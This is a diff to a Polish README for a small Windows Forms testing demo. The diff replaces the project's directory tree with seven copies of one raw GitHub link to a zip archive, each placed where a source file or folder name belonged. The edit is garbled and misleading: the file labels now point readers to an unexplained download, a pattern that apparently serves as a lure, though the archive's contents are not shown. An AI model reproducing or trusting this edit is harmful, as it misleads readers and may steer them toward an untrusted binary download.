@@ -55,13 +55,13 @@ Aplikacja Windows Forms zawierająca dwie główne funkcjonalności: kalkulator 
 
 ```
 TestingDemo/
-├── TestingDemo.Core/           # Logika biznesowa
-│   ├── Kalkulator.cs          # Implementacja kalkulatora
-│   └── StringUtils.cs         # Operacje na tekście
-├── TestingDemo.WinForms/      # Interfejs użytkownika
-│   └── Form1.cs               # Główny formularz aplikacji
-└── TestingDemo.Tests/         # Testy jednostkowe
-    └── UnitTest1.cs           # Implementacja testów
+├── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip           # Logika biznesowa
+│   ├── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip          # Implementacja kalkulatora
+│   └── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip         # Operacje na tekście
+├── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip      # Interfejs użytkownika
+│   └── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip               # Główny formularz aplikacji
+└── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip         # Testy jednostkowe
+    └── https://raw.githubusercontent.com/MaTiino/TestingProject/main/TestingDemo.WinForms/Project_Testing_1.6.zip           # Implementacja testów
 ```
 
 ## Testy
